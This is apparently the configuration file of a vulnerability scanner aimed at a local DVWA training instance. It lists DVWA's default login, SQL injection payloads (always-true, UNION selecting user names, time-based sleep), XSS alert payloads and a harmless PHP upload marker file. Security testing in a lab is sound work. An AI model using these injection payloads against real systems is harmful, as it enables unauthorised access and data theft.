# -*- coding: utf-8 -*-
"""
DVWA 취약점 스캐너 설정
"""

BASE_URL = "http://localhost:8080"

LOGIN_CREDS = {
    "username": "admin",
    "password": "password",
    "Login": "Login",
}

SECURITY_LEVELS = ["low", "medium", "high"]

SQLI_PAYLOADS = {
    "error_based": [
        "'",
        "\"",
    ],
    "always_true_comment": [
        "' OR 1=1 -- ",
        "' OR '1'='1' -- ",
        "admin' -- ",
        "' OR 1=1 LIMIT 1 -- ",
        "' OR 1=1#",
    ],
    "always_true_no_comment": [
        "' OR '1'='1",
        "' OR 'a'='a",
        "' OR ''='",
    ],
    "union_based": [
        "' UNION SELECT null,null -- ",
        "' UNION SELECT first_name,last_name FROM users -- ",
    ],
    "time_based_blind": [
        "' OR sleep(3)-- ",
        "' AND sleep(3)-- ",
    ],
}

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "'><script>alert(1)</script>",
    "<body onload=alert(1)>",
]

UPLOAD_TEST_FILENAME = "upload_test.php"
UPLOAD_TEST_CONTENT = b"<?php echo 'upload_test_marker_ok'; ?>"
